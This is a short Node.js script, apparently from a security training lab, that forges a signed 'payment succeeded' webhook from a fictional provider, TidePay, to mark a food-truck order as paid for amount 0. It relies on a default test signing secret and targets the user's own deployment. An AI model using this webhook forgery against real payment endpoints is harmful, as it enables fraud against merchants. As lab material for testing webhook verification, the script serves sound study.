// Plays TidePay, a made-up payment provider, telling the truck an order is paid.
//
// Usage: node attack/payment-webhook.mjs <order id> --target <your deployment>

import { createHmac } from "node:crypto";
import { parseArgs } from "node:util";
import { fail, parseTarget } from "./shared.mjs";

const SECRET = process.env.TIDEPAY_WEBHOOK_SECRET ?? "tidepay_test_secret";

const { positionals, values } = parseArgs({ allowPositionals: true, options: { target: { type: "string" } } });
const orderId = positionals[0];
if (!orderId) fail("Pass the order id from the lunch form, like: node attack/payment-webhook.mjs ord_1234abcd --target ...");
const target = parseTarget(values.target);

const body = JSON.stringify({ type: "payment.succeeded", orderId, amount: 0, provider: "tidepay" });
const signature = createHmac("sha256", SECRET).update(body).digest("hex");

const res = await fetch(`${target}/api/webhooks/payment`, {
  method: "POST",
  headers: { "content-type": "application/json", "user-agent": "TidePay-Webhooks/1.0", "x-tidepay-signature": signature },
  body,
});

console.log(`TidePay → ${target}/api/webhooks/payment`);
console.log(`  ${res.status} ${await res.text()}`);
